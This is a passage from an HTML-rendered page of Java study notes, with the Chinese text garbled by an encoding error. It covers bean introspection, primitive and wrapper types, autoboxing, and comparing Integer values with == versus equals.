&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">BeanInfo&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Introspector&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBeanInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è·å–å±æ€§åˆ—è¡¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">PropertyDescriptor&lt;/span> &lt;span style="color:#111">pd&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">info&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPropertyDescriptors&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getReadMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriteMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getAge&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setAge&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="è¯­æ³•åŸºç¡€">è¯­æ³•åŸºç¡€&lt;/h2>
&lt;h3 id="å˜é‡æ•°æ®ç±»å‹">å˜é‡&amp;amp;æ•°æ®ç±»å‹&lt;/h3>
&lt;ul>
&lt;li>ç±»ä¼¼cçš„èµ‹å€¼é£æ ¼ï¼š&lt;code>ç±»å‹ å˜é‡å = å˜é‡å€¼&lt;/code>ï¼ˆä¸åŒäºgoï¼‰&lt;/li>
&lt;li>ç¨‹åºè®¾è®¡çš„ä¸€ä¸ªé‡è¦åŸåˆ™ï¼šæ•°æ®çš„å­˜å‚¨å’Œæ˜¾ç¤ºè¦åˆ†ç¦»&lt;/li>
&lt;li>æ‰§è¡Œ&lt;code>int x = n&lt;/code>è¿™æ ·çš„å˜é‡èµ‹å€¼æ—¶ï¼Œç›¸å½“äºä¸¤æ­¥æ“ä½œï¼Œxä¸næ˜¯ä¸åŒçš„å­˜å‚¨å•å…ƒ&lt;/li>
&lt;li>åŸºæœ¬ç±»å‹æœ‰&lt;code>byte&lt;/code>, &lt;code>int&lt;/code>, &lt;code>short&lt;/code>, &lt;code>long&lt;/code>, &lt;code>float&lt;/code>, &lt;code>double&lt;/code>, &lt;code>boolean&lt;/code>, &lt;code>char&lt;/code>ï¼ˆè¡¨ç¤ºasciiæˆ–ä¸€ä¸ªUnicodeå­—ç¬¦ï¼‰ï¼Œä¸å¯èµ‹å€¼null&lt;/li>
&lt;li>å¼•ç”¨ç±»å‹ä¸ºæ‰€æœ‰classå’Œinterfaceç±»å‹ï¼Œå¯èµ‹å€¼ä¸ºnullè¡¨ç¤ºç©º&lt;/li>
&lt;li>ä½¿ç”¨å¯¹åº”çš„Wrapper ClassåŒ…è£…ç±»å¯ä»¥å°†åŸºæœ¬ç±»å‹è§†ä¸ºå¼•ç”¨ç±»å‹(class)ï¼Œå¥½å¤„æ˜¯å¯ä»¥ä½¿ç”¨å¤§é‡çš„å®ç”¨æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">100&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// é€šè¿‡newæ“ä½œç¬¦åˆ›å»ºIntegerå®ä¾‹(ä¸æ¨èä½¿ç”¨,ä¼šæœ‰ç¼–è¯‘è­¦å‘Š):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// é€šè¿‡é™æ€æ–¹æ³•valueOf(int)åˆ›å»ºIntegerå®ä¾‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// é€šè¿‡é™æ€æ–¹æ³•valueOf(String)åˆ›å»ºIntegerå®ä¾‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;100&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ¯ç§åŸºæœ¬ç±»å‹éƒ½æœ‰å…¶åŒ…è£…ç±»å‹&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">åŸºæœ¬ç±»å‹&lt;/th>
&lt;th style="text-align:left">å¯¹åº”çš„å¼•ç”¨ç±»å‹&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">boolean&lt;/td>
&lt;td style="text-align:left">java.lang.Boolean&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">byte&lt;/td>
&lt;td style="text-align:left">java.lang.Byte&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">short&lt;/td>
&lt;td style="text-align:left">java.lang.Short&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">java.lang.Integer&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long&lt;/td>
&lt;td style="text-align:left">java.lang.Long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">java.lang.Float&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">java.lang.Double&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">java.lang.Character&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>æ‰€æœ‰çš„æ•´æ•°å’Œæµ®ç‚¹æ•°çš„åŒ…è£…ç±»å‹éƒ½ç»§æ‰¿è‡ª&lt;code>Number&lt;/code>ï¼Œå› æ­¤ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿åœ°ç›´æ¥é€šè¿‡åŒ…è£…ç±»å‹è·å–å„ç§åŸºæœ¬ç±»å‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å‘ä¸Šè½¬å‹ä¸ºNumber:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#111">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">999&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è·å–byte, int, long, float, double:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">byteValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">ln&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">longValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">floatValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">d&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doubleValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>ç”±äºjavaä¸­å¹¶ä¸å­˜åœ¨æ— ç¬¦å·æ•´å‹è¿™ä¸€è¯´ï¼Œå…¨éƒ¨éƒ½æ˜¯æœ‰æ•´å‹çš„ï¼Œéœ€è¦é€šè¿‡åŒ…è£…ç±»å‹çš„é™æ€æ–¹æ³•æ¥å®Œæˆï¼Œæ¯”å¦‚&lt;code>Byte.toUnsignedInt()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>int&lt;/code>å’Œå¯¹åº”çš„&lt;code>Integer&lt;/code>å¯ä»¥äº’ç›¸è½¬åŒ–ï¼Œç”šè‡³ç›´æ¥ä½¿ç”¨&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = 100; // ç¼–è¯‘å™¨è‡ªåŠ¨ä½¿ç”¨Integer.valueOf(int)
int x = n; // ç¼–è¯‘å™¨è‡ªåŠ¨ä½¿ç”¨Integer.intValue()
&lt;/code>&lt;/pre>&lt;p>è¿™ç§ç›´æ¥æŠŠ&lt;code>int&lt;/code>å˜ä¸º&lt;code>Integer&lt;/code>çš„èµ‹å€¼å†™æ³•ï¼Œç§°ä¸ºè‡ªåŠ¨è£…ç®±ï¼ˆAuto Boxingï¼‰ï¼›åè¿‡æ¥ï¼ŒæŠŠ&lt;code>Integer&lt;/code>å˜ä¸º&lt;code>int&lt;/code>çš„èµ‹å€¼å†™æ³•ï¼Œç§°ä¸ºè‡ªåŠ¨æ‹†ç®±ï¼ˆAuto Unboxingï¼‰&lt;/p>
&lt;p>æ³¨æ„ï¼šè‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±åªå‘ç”Ÿåœ¨ç¼–è¯‘é˜¶æ®µï¼Œç›®çš„æ˜¯ä¸ºäº†å°‘å†™ä»£ç ã€‚&lt;/p>
&lt;p>è£…ç®±å’Œæ‹†ç®±ä¼šå½±å“ä»£ç çš„æ‰§è¡Œæ•ˆç‡ï¼Œå› ä¸ºç¼–è¯‘åçš„&lt;code>class&lt;/code>ä»£ç æ˜¯ä¸¥æ ¼åŒºåˆ†åŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹çš„ã€‚å¹¶ä¸”ï¼Œè‡ªåŠ¨æ‹†ç®±æ‰§è¡Œæ—¶å¯èƒ½ä¼šæŠ¥&lt;code>NullPointerException&lt;/code>ï¼ˆä¸¤ç§ç±»å‹å¯¹nullçš„å®¹å¿åº¦ä¸åŒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// NullPointerException
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ‰€æœ‰åŒ…è£…ç±»å‹éƒ½æ˜¯ä¸å˜ç±»ï¼Œå’ŒStringä¸€æ ·é€šè¿‡å†…éƒ¨çš„&lt;code>private final int&lt;/code>å­—æ®µå®ç°ï¼Œæ— æ³•æ´¾ç”Ÿå­ç±»&lt;/li>
&lt;li>åˆ¤æ–­å€¼ç±»å‹çš„å˜é‡æ˜¯å¦ç›¸ç­‰å¯ç”¨&lt;code>==&lt;/code>ï¼Œä½†æ˜¯åŒ…è£…ç±»å‹å¿…é¡»ç”¨&lt;code>equals&lt;/code>æ¯”è¾ƒï¼ˆå¼•ç”¨ç±»å‹å­˜åœ¨å€¼ç›¸ç­‰ä½†æŒ‡å‘ä¸åŒå¯¹è±¡çš„æƒ…å†µï¼‰ï¼ï¼ï¼è¯¦ç»†çš„æ¼”ç¤º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x == y: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m == n: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x.equals(y): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m.equals(n): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
